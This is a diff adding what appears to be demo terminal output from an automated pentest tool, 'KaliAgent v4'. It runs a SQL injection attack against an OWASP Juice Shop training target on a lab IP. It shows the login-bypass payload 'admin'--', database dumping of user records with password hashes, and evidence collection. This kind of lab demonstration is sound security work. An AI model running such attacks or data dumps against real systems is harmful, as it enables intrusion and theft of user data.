@@ -1,0 +1,69 @@
+
+╔═══════════════════════════════════════════════════════════════╗
+║  💉 KALIAGENT V4 - SQL INJECTION ATTACK                       ║
+╚═══════════════════════════════════════════════════════════════╝
+
+$ ./kaliagent attack -t 10.0.100.10 -a web --method sql_injection
+
+⚔️  Launching web attack on 10.0.100.10...
+🎯 Target: OWASP Juice Shop (port 3000)
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+STEP 1/5: Reconnaissance
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+[✓] Nmap scan confirmed web server
+[✓] Technology stack identified:
+    • Framework: Angular
+    • Server: Apache 2.4.18
+    • Database: SQLite
+
+STEP 2/5: Vulnerability Detection
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+[✓] SQLMap scan initiated
+[✓] Testing GET parameters...
+[✓] Testing POST parameters...
+[!] VULNERABILITY FOUND!
+    Location: /rest/user/authentication
+    Parameter: username
+    Type: Boolean-based blind SQL injection
+
+STEP 3/5: Exploitation
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+[✓] Crafting payload: admin'--
+[✓] Sending request...
+[!] AUTHENTICATION BYPASSED!
+    Logged in as: admin@juice-sh.op
+    Role: Administrator
+
+STEP 4/5: Post-Exploitation
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+[✓] Dumping database...
+[✓] Extracting users table...
+[!] 127 user records found!
+    • admin@juice-sh.op (password hash extracted)
+    • jim@juice-sh.op
+    • bender@juice-sh.op
+    • (124 more...)
+
+[✓] Extracting products table...
+[✓] Extracting orders table...
+
+STEP 5/5: Evidence Collection
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+[✓] Screenshot captured
+[✓] Request/response logs saved
+[✓] Database dump exported
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+🎉 ATTACK SUCCESSFUL!
+
+Summary:
+  • Target: 10.0.100.10:3000
+  • Vulnerability: SQL Injection (CVSS 9.8)
+  • Access Gained: Administrator
+  • Data Exfiltrated: 127 user records
+
+💾 Evidence saved to: evidence/sqli_20260424_061000/
+📄 Report updated: reports/pentest_report_20260424.pdf
